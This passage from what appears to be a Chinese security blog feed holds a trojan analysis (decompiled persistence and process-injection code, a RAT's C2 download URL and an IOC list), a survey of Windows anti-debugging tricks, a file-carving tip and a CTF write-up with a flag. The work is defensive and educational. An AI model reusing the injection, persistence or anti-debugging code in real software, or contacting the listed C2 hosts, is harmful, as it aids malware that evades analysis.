添加自启动</span><br>      RegCloseKey(phkResult);<br>      <span class="hljs-keyword">if</span> ( RegOpenKeyExA(HKEY_CURRENT_USER, aSoftwareMicros_0, <span class="hljs-number">0</span>, <span class="hljs-number">0xF003F</span>u, &amp;phkResult) )<span class="hljs-comment">// Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Fol</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      RegSetValueExA(phkResult, ValueName, <span class="hljs-number">0</span>, <span class="hljs-number">1u</span>, &amp;Dst, <span class="hljs-built_in">strlen</span>(&amp;Dst) + <span class="hljs-number">1</span>);<br>      RegCloseKey(phkResult);<br>    &#125;<br>    <span class="hljs-built_in">strcat</span>(&amp;Dst, aCtfmonExe);                   <span class="hljs-comment">// ctfmon.exe</span><br>    v4 = _p___argv(<span class="hljs-number">0</span>, &amp;Dst);<br>    CopyFileA(**v4, &amp;Dst, <span class="hljs-number">0</span>);                   <span class="hljs-comment">// 创建文件ctfmon.exe</span><br>    v5 = FindResourceA(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0xA</span>);              <span class="hljs-comment">// 从资源节提取数据</span><br>    v6 = v5;<br>    <span class="hljs-keyword">if</span> ( v5 )<br>    &#123;<br>      v7 = SizeofResource(<span class="hljs-number">0</span>, v5);<br>      <span class="hljs-keyword">if</span> ( v7 )<br>      &#123;<br>        v8 = LoadResource(<span class="hljs-number">0</span>, v6);<br>        <span class="hljs-keyword">if</span> ( v8 )<br>        &#123;<br>          v9 = LockResource(v8);<br>          <span class="hljs-keyword">if</span> ( v9 )<br>          &#123;<br>            GetSystemDirectoryA(&amp;Buffer, <span class="hljs-number">0x104</span>u);<br>            <span class="hljs-built_in">strcat</span>(&amp;Buffer, aAlgExe);           <span class="hljs-comment">// alg.exe</span><br>            sub_4016D0(v9, &amp;unk_4032C0, v7, &amp;Buffer);<span class="hljs-comment">// 实现进程注入</span><br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>其实经过静态分析之后此程序的执行逻辑已经比较完善了，但是有些细节还是要通过动态分析来进一步确定：</p><h3 id="动态分析-1"><a href="#动态分析-1" class="headerlink" title="动态分析"></a>动态分析</h3><p>创建文件夹，如果目录已存在则跳过，如果不存在则执行下面的操作：</p><p><img src="https://i.loli.net/2019/05/16/5cdd7d715871131390.png"></p><p>复制当前目录</p><p><img src="https://i.loli.net/2019/05/16/5cdd7e5b4fc5457591.png"></p><p>执行注册表部分备份：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">regedit.exe <span class="hljs-regexp">/s /</span>e  %s\back1.reg <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&quot;</span><br></code></pre></td></tr></table></figure><p>设置开机启动</p><p><img src="https://i.loli.net/2019/05/16/5cdd81f35b2d898013.png"></p><p>将自身复制为ctfmon.exe</p><p><img src="https://i.loli.net/2019/05/16/5cdd85f2dbbe266549.png"></p><p>将从资源节中提取的PE数据注入到alg.exe中</p><p><img src="https://i.loli.net/2019/05/17/5cde781a2488714506.png"></p><p>获取函数ZwUnmapViewOfSection的地址</p><p><img src="https://i.loli.net/2019/05/16/5cdd87275e2c878052.png"></p><p>实现进程注入</p><p><img src="https://i.loli.net/2019/05/16/5cdd87a1bd17a11683.png"></p><p><img src="https://i.loli.net/2019/05/16/5cdd889e40da963845.png"></p><h3 id="分析结果-1"><a href="#分析结果-1" class="headerlink" title="分析结果"></a>分析结果</h3><p>此程序实现的功能如下：</p><ul><li>设置开机启动，实现长期驻留</li><li>文件备份</li><li>进程注入</li><li>唤醒注入的程序</li></ul><h2 id="子程序分析rsc-exe"><a href="#子程序分析rsc-exe" class="headerlink" title="子程序分析rsc.exe"></a>子程序分析rsc.exe</h2><h3 id="静态分析-2"><a href="#静态分析-2" class="headerlink" title="静态分析"></a>静态分析</h3><p>此木马使用GetProcAddress函数来获取所需函数的地址</p><p><img src="https://i.loli.net/2019/05/17/5cde0daa3bf5153751.png"></p><p>程序中有很多地方都用到了这种方法来降低自身被安全人员发现的概率。</p><p><img src="https://i.loli.net/2019/05/17/5cde6caf4f75939607.png"></p><p>SeDebugPrivilege提权：</p><p><img src="https://i.loli.net/2019/05/17/5cde755d140c587246.png"></p><p>主要函数</p><p><img src="https://i.loli.net/2019/05/17/5cde6ccfccb9659041.png"></p><h3 id="动态分析-2"><a href="#动态分析-2" class="headerlink" title="动态分析"></a>动态分析</h3><p>打开网址<code>http[:]//www[.]softover[.]net/chendog/rat[.]gif</code></p><p><img src="https://i.loli.net/2019/05/17/5cde1b617ca4982366.png"></p><p>下载此文件</p><p><img src="https://i.loli.net/2019/05/17/5cde1c081944710175.png"></p><p>其他相关DNS查询</p><p><img src="https://i.loli.net/2019/05/17/5cde1f92caa9384845.png"></p><p>对比代码发现此程序可能是远程控制软件psyrat2的变种。</p><p>后门功能实现的主要函数为sub_403190，代码量较大，这里就不一一说明分析过程了，下面直接给出分析结果。</p><h3 id="分析结果-2"><a href="#分析结果-2" class="headerlink" title="分析结果"></a>分析结果</h3><p>根据以上分析得出此程序的主要功能：</p><ul><li>受害主机环境识别（CPU信息，系统版本）</li><li>隐藏自身</li><li>重启|关闭计算机</li><li>通过网络传送文件</li><li>常见的文件读写与目录操作</li><li>屏幕截取</li><li>进程遍历|终止某一进程</li><li>操作可移动设备</li><li>远程执行命令</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h3><ul><li>不要浏览不良网站</li><li>及时更新计算机的杀毒程序，但是不要觉得有了杀软保护就可以放松警惕比如此恶意软件的检出率较低</li><li>在计算机控制面板中设置显示文件后缀名，此案例中恶意代码就是将可执行程序伪装成存储有色情图片的文件夹引诱用户点击，因此如果设置显示文件后缀名可以发现此文件后缀是EXE，能在一定程度上看破这种伪装</li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>有趣的是在我分析这个样本时曾将样本上传到VT和微步在线分析过，第一次上传到微步在线的时候只有两个反病毒引擎检测出，但是过了没几分钟刷新了一下页面就发现又多出了两个反病毒引擎识别出了此恶意软件，而且根据腾讯反病毒引擎的识别结果，貌似将这个恶意软件识别为了DNF的木马，（并没有查到腾讯对病毒的命名标准，只是猜测）。</p><p><img src="https://i.loli.net/2019/05/17/5cde2637864b772954.png"></p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs coq">C2--------------------------------------------------------------<br>         | <span class="hljs-type">http</span>[:]//www[.]softover[.]net/chendog/rat[.]gif<br>         | <span class="hljs-type">cn</span>[.]fetftp[.]nu<br>         | <span class="hljs-type">rt</span>[.]softseek[.]org<br><span class="hljs-keyword">Path</span>-------------------------------------------------------------<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\<span class="hljs-number">1.</span>jpg<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\<span class="hljs-number">2.</span>jpg<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\<span class="hljs-number">3.</span>jpg<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\<span class="hljs-number">4.</span>jpg<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\<span class="hljs-number">5.</span>jpg<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\<span class="hljs-number">6.</span>jpg<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\<span class="hljs-number">7.</span>jpg<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>\Thumbs.db<br>         | <span class="hljs-type">C</span>:\Users\[xxxx]\AppData\<span class="hljs-keyword">Local</span>\Temp\byeyou.tmp<br>         | <span class="hljs-type">C</span>:\Users\[xxxx]\AppData\<span class="hljs-keyword">Local</span>\Temp\rat.EXE<br>         | <span class="hljs-type">C</span>:\ProgramData\Microsoft\Comon\ctfmon.exe<br>String-----------------------------------------------------------<br>         | <span class="hljs-type">sfctlcom</span>.exe<br>         | <span class="hljs-type">pavfnsvr</span>.exe<br>         | <span class="hljs-type">regedit</span>.exe /s /e  %s\back1.reg <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&quot;</span><br>Filename---------------------------------------------------------<br>         | <span class="hljs-type">18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>.EXE<br>         | <span class="hljs-type">ctfmon</span>.exe<br>         | <span class="hljs-type">rat</span>.EXE<br>         | <span class="hljs-type">byeyou</span>.tmp<br>         | <span class="hljs-type">Thumbs</span>.db<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows恶意代码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows恶意代码</tag>
      
      <tag>远程控制</tag>
      
      <tag>木马</tag>
      
      <tag>分析报告</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WallpaperEngine资源提取</title>
    <link href="/2019/05/WallpaperEngine%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96/"/>
    <url>/2019/05/WallpaperEngine%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<p>有时在WallpaperEngine中发现自己喜欢的静态壁纸想将其中图片从包文件提取出来的话直接在Kali Linux中运行命令：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">foremost</span> 包文件<br></code></pre></td></tr></table></figure><p>在output文件夹中可以看到提取出来的内容。</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小窍门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows反调试实现与绕过姿势汇总</title>
    <link href="/2019/05/Windows%E5%8F%8D%E8%B0%83%E8%AF%95%E5%AE%9E%E7%8E%B0%E4%B8%8E%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/"/>
    <url>/2019/05/Windows%E5%8F%8D%E8%B0%83%E8%AF%95%E5%AE%9E%E7%8E%B0%E4%B8%8E%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="调试器检测"><a href="#调试器检测" class="headerlink" title="调试器检测"></a>调试器检测</h2><h3 id="PEB相关"><a href="#PEB相关" class="headerlink" title="PEB相关"></a>PEB相关</h3><h4 id="BeingDebugged"><a href="#BeingDebugged" class="headerlink" title="BeingDebugged"></a>BeingDebugged</h4><p>BeingDebugged是位于PEB（Process Environment Block，进程环境块）偏移0x2处的标志。</p><h4 id="IsDebuggerPresent"><a href="#IsDebuggerPresent" class="headerlink" title="IsDebuggerPresent()"></a>IsDebuggerPresent()</h4><p><code>IsDebuggerPresent()</code>是Windows的API，这个函数通过查询PEB中的BeingDebugged标志来判断当前进程是否处于被调试状态。</p><h4 id="NtGlobalFlag"><a href="#NtGlobalFlag" class="headerlink" title="NtGlobalFlag"></a>NtGlobalFlag</h4><p>NtGlobalFlag位于PEB的0x068h处，如果BeingDebugged被设置为TRUE，则NtGlobalFlag的值为70h。</p><h4 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent()"></a>CheckRemoteDebuggerPresent()</h4><p>CheckRemoteDebuggerPresent( )与IsDebuggerPresent( )类似，同为Windows API，可以直接调用，<code>CheckRemoteDebuggerPresent()</code>实际调用了NtQueryInformationProcess()，查询某个进程的ProcessDebugPort即系统与调试器通信的端口句柄，CheckRemoteDebuggerPresent()通过查询这个值来确定程序是否处于调试状态。</p><span id="more"></span><h4 id="ProcessHeap"><a href="#ProcessHeap" class="headerlink" title="ProcessHeap"></a>ProcessHeap</h4><p>ProcessHeap位于PEB的0x018，处正常情况下，系统为进程创建一个堆，会将进程堆位于+0x00c处的Flags设置为2，将位于+0x010处的ForceFlags设置为0，但在调试状态下这两个位置的值会发生改变。</p><h3 id="基于系统痕迹"><a href="#基于系统痕迹" class="headerlink" title="基于系统痕迹"></a>基于系统痕迹</h3><h4 id="父进程检测"><a href="#父进程检测" class="headerlink" title="父进程检测"></a>父进程检测</h4><p>一个进程被正常启动时，其父进程一般是Explore.exe文件资源管理器、cmd.exe、或者Services.exe系统服务。如果一个进程的父进程不是这些进程，可以怀疑其被调试了。</p><h4 id="堆数据检测"><a href="#堆数据检测" class="headerlink" title="堆数据检测"></a>堆数据检测</h4><p>由于BeingDebugged被设置为TRUE，NtGlobalFlag设置了FLG_HEAP_VALIDATE_PARAMETERS，RtlCreateHeap函数用RtlDebugCteateHeap函数创建堆，与此同时在堆中填充数据：<code>BA AD F0 0D</code>、<code>FE EE FE EE</code>、<code>AB AB AB AB</code>，如果这些数据出现的次数较多（大于10次）则说明被调试了。</p><h4 id="注册表检测"><a href="#注册表检测" class="headerlink" title="注册表检测"></a>注册表检测</h4><p>下面是调试器在注册表中的一个常用位置。</p><p>SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug(32位系统)</p><p>SOFTWARE\Wow6432Node\Microsoft\WindowsNT\CurrentVersion\AeDebug(64位系统)</p><p>该注册表项指定当应用程序发生错误时，触发哪一个调试器。默认情况下，它被设置为Dr.Watson。如果该这册表的键值被修改为OllyDbg，则恶意代码就可能确定它正在被调试。</p><h4 id="进程遍历"><a href="#进程遍历" class="headerlink" title="进程遍历"></a>进程遍历</h4><p>枚举进程中是否有调试器进程。</p><h4 id="窗口遍历"><a href="#窗口遍历" class="headerlink" title="窗口遍历"></a>窗口遍历</h4><p>枚举主窗口的标题，判断是否有调试器窗口，与上面的进程检测方法一样，这样的反调试很容易绕过。</p><h3 id="基于调试器行为的检测"><a href="#基于调试器行为的检测" class="headerlink" title="基于调试器行为的检测"></a>基于调试器行为的检测</h3><h4 id="硬件断点检测"><a href="#硬件断点检测" class="headerlink" title="硬件断点检测"></a>硬件断点检测</h4><p>调试器使用DR0~Dr3作为硬件断点，通过检查这几个寄存器的值是否为空来确定当前程序是否被调试。</p><h4 id="软件断点检测"><a href="#软件断点检测" class="headerlink" title="软件断点检测"></a>软件断点检测</h4><p>调试器软件断点是将断点处的指令替换为INT 3，当程序运行到这一条指令时会调用异常处理例程，从而检查内存中INT 3指令的机器码0xCC可以检查软件断点。除了INT 3还有INT 2D、CD03。</p><h4 id="检测DBGHELP模块"><a href="#检测DBGHELP模块" class="headerlink" title="检测DBGHELP模块"></a>检测DBGHELP模块</h4><p>调试器一般使用微软提供的DBGHELP库来装载调试符号，如果一个进程装载了DBGHELP.DLL那么这个进程很可能是一个调试器。</p><h4 id="代码CRC值校验"><a href="#代码CRC值校验" class="headerlink" title="代码CRC值校验"></a>代码CRC值校验</h4><p>通过对需要保护的代码进行CRC校验或者MD5值校验可以保证这部分代码不被篡改且无法下软断点。</p><h4 id="SetUnhandledExceptionFilter"><a href="#SetUnhandledExceptionFilter" class="headerlink" title="SetUnhandledExceptionFilter"></a>SetUnhandledExceptionFilter</h4><p>在进程发生异常的时候若SEH未处理或者注册的SEH不存在，则会调用UnhandledExceptionFilter，它会运行系统最后的异常处理器，UnhandledExceptionFilter会判断当前进程是否被调试，如果处于被调试状态则将异常传递给调试器，若进程没有被调试则将异常传递给系统最后的异常处理器。使用SetUnhandledExceptionFilter可以修改系统最后的处理器，我们可以修改系统最后的异常处理器为正常逻辑中的一个过程，经由这个正常逻辑过程运行的程序才能正常运行，达到反调试效果。</p><h3 id="其他检测方法"><a href="#其他检测方法" class="headerlink" title="其他检测方法"></a>其他检测方法</h3><h4 id="TrapFlag检测"><a href="#TrapFlag检测" class="headerlink" title="TrapFlag检测"></a>TrapFlag检测</h4><p>CPU中有一个eflags标志位叫做Trap Flag，如果TF为1，CPU执行指令后会产生一个单步异常，因此可以提前在程序中设置可以跳转到正确程序逻辑的SEH，在触发异常之后，如果进入SEH中则程序可以正常运行，如果没有进入SEH则说明程序处于调试状态。</p><h4 id="ZwQuerySystemInformation"><a href="#ZwQuerySystemInformation" class="headerlink" title="ZwQuerySystemInformation()"></a>ZwQuerySystemInformation()</h4><p>在函数ZwQuerySystemInformation( )中，当SystemInformation&#x3D;SystemKernelDebuggerInformation，判断DebuggerEnabled和DebuggerNotPresent()的值可以探测系统调试器是否存在。</p><h4 id="SeDebugPrivilege权限检测"><a href="#SeDebugPrivilege权限检测" class="headerlink" title="SeDebugPrivilege权限检测"></a>SeDebugPrivilege权限检测</h4><p>正常进程不具有SeDebugPrivilege权限，但是调试器具有此权限，当进程从调试器加载时，进程会继承调试器的SeDebugPrivilege权限。可以通过打开CSRSS.EXE进程间接地检查进程是否有SeDebugPrivilege权限，因为默认权限无法对CSRSS.EXE进行OPENPROCESS。</p><h4 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h4><p>实际上并不是程序在加载到调试器后，会让第一条指令执行之前而暂停程序的运行，而是调试器从程序PE头部指定的入口点开始。TLS回调被用来在程序入口点执行之前运行代码，因为这些代码可以在调试器中秘密地执行。</p><p>TLS是Windows的一个存储类，其中数据对象不是一个自动的堆栈变量，而是代码中运行的每个线程的一个本地变量，TLS允许每个线程维护一个用TLS声明的专有变量，在应用程序实现TLS的情况下，可执行程序的PE头部会包含一个<code>.tls</code>段。TLS提供了初始化和终止TLS对象的回调函数。使用<code>PEView</code>可以看到<code>.tls</code>段，正常程序不会使用这个段。可以使用调试器在TLS回调函数运行之前下断点来分析这些函数。</p><h4 id="DebugObject"><a href="#DebugObject" class="headerlink" title="DebugObject"></a>DebugObject</h4><p>在调试器附加到一个进程的过程中会调用ZwCreateDebugObject创建DebugObject，正常的进程中DebugObject为NULL，如果不是NULL则说明有一个用户态调试器的进程。使用ZwQueryObject查询所有对象的类型，如果DebugObject的数目不为零则说明系统中存在调试器。</p><h4 id="运行时间差检测"><a href="#运行时间差检测" class="headerlink" title="运行时间差检测"></a>运行时间差检测</h4><p>当一个程序运行过程中出现异常时，会将异常传递给调试器由调试器决定处理异常的过程，但是在这个过程中程序运行所需的事件比程序自身直接执行的时间要长很多，因此可以计算一个操作运行的时间来判断当前程序是否正在被调试，常用的方法是RDTSC指令和GetTickCount()函数。</p><h3 id="已失效的方法"><a href="#已失效的方法" class="headerlink" title="已失效的方法"></a>已失效的方法</h3><h4 id="GetLastError"><a href="#GetLastError" class="headerlink" title="GetLastError( )"></a>GetLastError( )</h4><p>虽然这个方法在较新版本的Windows中不再使用，但是我们还是可以了解一下原理。</p><p>使用GetLastError( )可以得到程序运行过程中的出现的错误的原因，在程序出现错误时会改变此函数的返回值，而可以利用此原理首先使用SetLastError()设置LastError为某值，然后通过故意的与调试器相关的错误调用如OutputDebugString()使得程序中出现错误，如果当前程序被调试则OutputDebugString()成功调用因此LastError的值不会改变，但是如果没有被调试则LastError的值会因为OutputDebugString()没有成功调用而发生改变，通过前后LastError的值的对比来判断程序被调试。</p><h2 id="干扰调试器"><a href="#干扰调试器" class="headerlink" title="干扰调试器"></a>干扰调试器</h2><h4 id="Drx寄存器清理"><a href="#Drx寄存器清理" class="headerlink" title="Drx寄存器清理"></a>Drx寄存器清理</h4><p>OllyDbg在捕获到一个异常时，会将Dr0~Dr7清零，但是如果设置SEH使用这些寄存器中的数据参与运算，通过对比运算结果是否正确可以判断这些寄存器是否被清空即可判断程序是否被OllyDbg调试。</p><h4 id="OutputDebugStringA"><a href="#OutputDebugStringA" class="headerlink" title="OutputDebugStringA"></a>OutputDebugStringA</h4><p>此函数被用来向调试器发送一个格式化的串，但是OllyDbg1.1版本之前存在一个格式化字符串漏洞，使用类似如下的调用形式会触发此漏洞使OllyDbg崩溃：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">OutputDebugStringA(&quot;<span class="hljs-variable">%s%</span>s<span class="hljs-variable">%s%</span>s<span class="hljs-variable">%s%</span>s<span class="hljs-variable">%s%</span>s%s&quot;);<br></code></pre></td></tr></table></figure><h4 id="ThreadHideFromDebugger"><a href="#ThreadHideFromDebugger" class="headerlink" title="ThreadHideFromDebugger"></a>ThreadHideFromDebugger</h4><p>设置ThreadHideFromDebugger可以禁止为某个线程产生调试事件。</p><h4 id="EnableWindow"><a href="#EnableWindow" class="headerlink" title="EnableWindow"></a>EnableWindow</h4><p>调用这个API可以暂时锁定前台的窗口：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">EnableWindow(GetForegrounfWindow(),FALSE);<br></code></pre></td></tr></table></figure><h4 id="BlockInput"><a href="#BlockInput" class="headerlink" title="BlockInput"></a>BlockInput</h4><p>调用<code>BlockInput(TRUE)</code>锁住窗口，完成工作之后使用<code>BlockWindow(FALSE)</code>恢复。锁住期间可以通过<code>Ctrl+Alt+Del</code>组合键强制解除输入锁。</p><h4 id="防止被调试器附加"><a href="#防止被调试器附加" class="headerlink" title="防止被调试器附加"></a>防止被调试器附加</h4><p>Ring3调试器的附加使用的是DebugActiveProcess函数，在附加相关进程时，会首先执行到ntdll.dll下的ZwContinue函数，最后停留在ntdll.dll的DbgBreakPoint处。因此Hook一下ZwContinue函数可以实现防止进程被调试器附加的效果。</p><p>参考资料：</p><p>《恶意代码分析实战》</p><p>《加密与解密》第四版</p><p><a href="https://www.cnblogs.com/xiao-zhang/p/5245068.html">https://www.cnblogs.com/xiao-zhang/p/5245068.html</a></p>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反调试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019全国大学生信息安全竞赛初赛PWN-Reverse-WriteUp</title>
    <link href="/2019/04/2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BPWN-Reverse-WriteUp/"/>
    <url>/2019/04/2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BPWN-Reverse-WriteUp/</url>
    
    <content type="html"><![CDATA[<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="0x01-easyGo"><a href="#0x01-easyGo" class="headerlink" title="0x01 easyGo"></a>0x01 easyGo</h2><p><img src="https://i.loli.net/2019/04/29/5cc64745afb8d.png"></p><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">hvnt3r@LAPTOP-POUA9UHC:/mnt/e/linux$ file easygo<br>easygo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped<br>hvnt3r@LAPTOP-POUA9UHC:/mnt/e/linux$ ./easyGo<br>Please input you flag like flag&#123;123&#125; to judge:<br>flag&#123;1212121&#125;<br>Try again! Come on!<br></code></pre></td></tr></table></figure><p>Go的逆向，先用<code>IDAGolangHelper</code>恢复函数名，在<code>main_main</code>函数中找到<code>base64</code>加密，在函数位置下断点，<code>gdb</code>中单步运行，执行完<code>encoding_base64__ptr_Encoding_DecodeString</code>之后可以在<code>RSI</code>中看到<code>flag</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">[----------------------------------registers-----------------------------------]<br>RAX: 0x2a (<span class="hljs-string">&#x27;*&#x27;</span>)<br>RBX: 0x2a (<span class="hljs-string">&#x27;*&#x27;</span>)<br>RCX: 0x0 <br>RDX: 0x0 <br>RSI: 0xc000098060 (<span class="hljs-string">&quot;flag&#123;92094daf-33c9-431e-a85a-8bfbd5df98ad&#125;&quot;</span>)<br>RDI: 0x38 (<span class="hljs-string">&#x27;8&#x27;</span>)<br>RBP: 0xc000092f88 --&gt; 0xc000092f90 --&gt; 0x429b1c (mov    eax,DWORD PTR [rip+0x16478e]        <span class="hljs-comment"># 0x58e2b0)</span><br>RSP: 0xc000092e90 --&gt; 0xc000096580 (<span class="hljs-string">&quot;6789_-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345&quot;</span>, <span class="hljs-string">&#x27;\377&#x27;</span> &lt;repeats 45 <span class="hljs-built_in">times</span>&gt;, <span class="hljs-string">&quot;\005\377\377:;&lt;=&gt;?&quot;</span>)<br>RIP: 0x4952f0 (mov    rax,QWORD PTR [rsp+0x38])<br>R8 : 0x0 <br>R9 : 0x0 <br>R10: 0x2a (<span class="hljs-string">&#x27;*&#x27;</span>)<br>R11: 0x2a (<span class="hljs-string">&#x27;*&#x27;</span>)<br>R12: 0xc000098060 (<span class="hljs-string">&quot;flag&#123;92094daf-33c9-431e-a85a-8bfbd5df98ad&#125;&quot;</span>)<br>R13: 0xc000096580 (<span class="hljs-string">&quot;6789_-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345&quot;</span>, <span class="hljs-string">&#x27;\377&#x27;</span> &lt;repeats 45 <span class="hljs-built_in">times</span>&gt;, <span class="hljs-string">&quot;\005\377\377:;&lt;=&gt;?&quot;</span>)<br>R14: 0x2a (<span class="hljs-string">&#x27;*&#x27;</span>)<br>R15: 0x40 (<span class="hljs-string">&#x27;@&#x27;</span>)<br>EFLAGS: 0x206 (carry PARITY adjust zero sign <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)<br></code></pre></td></tr></table></figure><p><strong>flag：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs flag">flag&#123;92094daf-33c9-431e-a85a-8bfbd5df98ad&#125;<br></code></pre></td></tr></table></figure><h2 id="0x02-bbvvmm"><a href="#0x02-bbvvmm" class="headerlink" title="0x02 bbvvmm"></a>0x02 bbvvmm</h2><p><img src="https://i.loli.net/2019/04/29/5cc647867d4e3.png"></p><h2 id="0x03-strange-int"><a href="#0x03-strange-int" class="headerlink" title="0x03 strange_int"></a>0x03 strange_int</h2><p><img src="https://i.loli.net/2019/04/29/5cc647ad8df45.png"></p><h2 id="0x04-计时挑战"><a href="#0x04-计时挑战" class="headerlink" title="0x04 计时挑战"></a>0x04 计时挑战</h2><p><img src="https://i.loli.net/2019/04/29/5cc647deb4d25.png"></p><h2 id="0x05-where-u-are"><a href="#0x05-where-u-are" class="headerlink" title="0x05 where_u_are"></a>0x05 where_u_are</h2><p><img src="https://i.loli.net/2019/04/29/5cc6480bf38ce.png"></p><h1 id="RWN"><a href="#RWN" class="headerlink" title="RWN"></a>RWN</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><img src="https://i.loli.net/2019/04/29/5cc6485e4323d.png"></p><h2 id="0x02-baby-pwn"><a href="#0x02-baby-pwn" class="headerlink" title="0x02 baby_pwn"></a>0x02 baby_pwn</h2><p><img src="https://i.loli.net/2019/04/29/5cc648783ae12.png"></p><h2 id="0x03-daily"><a href="#0x03-daily" class="headerlink" title="0x03 daily"></a>0x03 daily</h2><p><img src="https://i.loli.net/2019/04/29/5cc648980a41b.png"></p><h2 id="0x04-Double"><a href="#0x04-Double" class="headerlink" title="0x04 Double"></a>0x04 Double</h2><p><img src="https://i.loli.net/2019/04/29/5cc648b6da857.png"></p><h2 id="0x05-bms"><a href="#0x05-bms" class="headerlink" title="0x05 bms"></a>0x05 bms</h2><p><img src="https://i.loli.net/2019/04/29/5cc648d2564fc.png"></p><h2 id="0x06-Virtual"><a href="#0x06-Virtual" class="headerlink" title="0x06 Virtual"></a>0x06 Virtual</h2><p><img src="https://i.loli.net/2019/04/29/5cc648e6070a3.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>逆向</tag>
